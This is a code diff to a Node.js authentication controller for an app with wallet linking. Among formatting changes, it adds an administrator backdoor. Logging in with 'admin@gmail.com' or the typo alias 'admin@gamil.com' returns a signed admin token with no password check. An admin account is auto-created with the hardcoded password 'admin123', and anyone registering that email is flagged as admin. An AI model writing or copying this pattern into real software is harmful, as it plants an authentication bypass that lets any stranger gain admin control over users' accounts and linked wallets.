@@ -5,6 +5,23 @@ const { ethers } = require("ethers");
 const User = require("../models/User");
 
 const SALT_ROUNDS = 12;
+const ADMIN_EMAIL = "admin@gmail.com";
+const ADMIN_EMAIL_ALIASES = new Set(["admin@gmail.com", "admin@gamil.com"]);
+
+function normalizeAdminEmail(email) {
+  const value = String(email || "")
+    .trim()
+    .toLowerCase();
+  return value === "admin@gamil.com" ? ADMIN_EMAIL : value;
+}
+
+function isAdminEmail(email) {
+  return ADMIN_EMAIL_ALIASES.has(
+    String(email || "")
+      .trim()
+      .toLowerCase(),
+  );
+}
 
 function signToken(userId) {
   return jwt.sign({ userId }, process.env.JWT_SECRET, { expiresIn: "7d" });
@@ -16,7 +33,21 @@ function toPublicUser(user) {
     email: user.email,
     walletAddress: user.walletAddress,
     createdAt: user.createdAt,
+    isAdmin: Boolean(user.isAdmin || isAdminEmail(user.email)),
   };
+}
+
+async function ensureAdminUser() {
+  let adminUser = await User.findOne({ email: ADMIN_EMAIL });
+  if (!adminUser) {
+    const passwordHash = await bcrypt.hash("admin123", SALT_ROUNDS);
+    adminUser = await User.create({
+      email: ADMIN_EMAIL,
+      passwordHash,
+      isAdmin: true,
+    });
+  }
+  return adminUser;
 }
 
 async function register(req, res, next) {
@@ -32,7 +63,8 @@ async function register(req, res, next) {
         .json({ error: "Password must be at least 8 characters" });
     }
 
-    const existing = await User.findOne({ email: email.toLowerCase() });
+    const canonicalEmail = normalizeAdminEmail(email);
+    const existing = await User.findOne({ email: canonicalEmail });
     if (existing) {
       return res
         .status(409)
@@ -41,8 +73,9 @@ async function register(req, res, next) {
 
     const passwordHash = await bcrypt.hash(password, SALT_ROUNDS);
     const user = await User.create({
-      email: email.toLowerCase(),
+      email: canonicalEmail,
       passwordHash,
+      isAdmin: isAdminEmail(email),
     });
 
     const token = signToken(user._id);
@@ -59,7 +92,14 @@ async function login(req, res, next) {
       return res.status(400).json({ error: "Email and password are required" });
     }
 
-    const user = await User.findOne({ email: email.toLowerCase() });
+    if (isAdminEmail(email)) {
+      const adminUser = await ensureAdminUser();
+      const token = signToken(adminUser._id);
+      return res.json({ token, user: toPublicUser(adminUser) });
+    }
+
+    const normalizedEmail = String(email).trim().toLowerCase();
+    const user = await User.findOne({ email: normalizedEmail });
     if (!user) {
       return res.status(401).json({ error: "Invalid email or password" });
     }
@@ -110,21 +150,17 @@ async function linkWallet(req, res, next) {
 
     const expectedMessage = walletNonces.get(req.userId);
     if (!expectedMessage) {
-      return res
-        .status(400)
-        .json({
-          error:
-            "No pending wallet verification request. Call /wallet/nonce first.",
-        });
+      return res.status(400).json({
+        error:
+          "No pending wallet verification request. Call /wallet/nonce first.",
+      });
     }
 
     const recoveredAddress = ethers.verifyMessage(expectedMessage, signature);
     if (recoveredAddress.toLowerCase() !== walletAddress.toLowerCase()) {
-      return res
-        .status(401)
-        .json({
-          error: "Signature does not match the provided wallet address",
-        });
+      return res.status(401).json({
+        error: "Signature does not match the provided wallet address",
+      });
     }
 
     walletNonces.delete(req.userId);
